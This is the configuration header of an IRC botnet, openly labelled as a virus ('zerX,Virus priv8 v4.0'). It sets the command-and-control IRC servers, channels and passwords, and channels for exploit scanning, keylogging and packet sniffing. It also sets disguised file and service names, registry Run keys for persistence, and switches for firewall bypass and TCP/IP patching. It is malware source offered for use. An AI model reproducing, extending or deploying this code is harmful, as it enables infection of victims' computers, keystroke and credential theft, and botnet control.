/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
#define AU_IP "86.126.x.x" 
#define AU_EXPLOIT "asn445" 

int port = 6667;		
int port2 = 6667;				
int tftpport = 69;		
int ftpport = brandom(1337,65535); 
int httpport = 8080;		
int rloginport = 513;		
unsigned short bindport = 1991;		
BOOL topiccmd = TRUE;		
BOOL rndfilename = TRUE;	
BOOL AutoStart = TRUE;		
char prefix = '.';		
int maxrand = 4;		
int nicktype = ALLNICK;	
BOOL nickprefix = TRUE;

#ifndef NO_CRYPT

#else  

char botid[] = "915860";		
char version[] = "ZxVs VRX";
char password[] = "HEHE362514";
char server[] = "s1";
char serverpass[] = "VrX";
char channel[] = "#VrX-5#";
char chanpass[] = "VrX";
char server2[] = "s2";
char channel2[] = "#VrX-5#";
char chanpass2[] = "VrX";
char filename[] = "YaRaby.exe";
char keylogfile[] = "winnt.bat";
char valuename[] = "Windows Service Agent";
char nickconst[] = "VrX|";
char szLocalPayloadFile[]="winsys.dat";
char modeonconn[] = "-x+i";
char exploitchan[] = "#VrX-MSN.scan#";
char keylogchan[] = "#LOG#";
char psniffchan[] = "#sniff#";

char *authost[] = {
	"*@*",
	
};

char *versionlist[] = {
	"mIRC v6.16 Khaled Mardam-Bey",
	"mIRC v6.17 Khaled Mardam-Bey",
	"mIRC v6.20 Khaled Mardam-Bey",
	"mIRC v6.21 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "fuckyouasshole"; 
#endif

const char partline[] = "."; 
const char floodline[] = ".";

BOOL BypassFW = TRUE;
BOOL PatchTCPIP = TRUE;

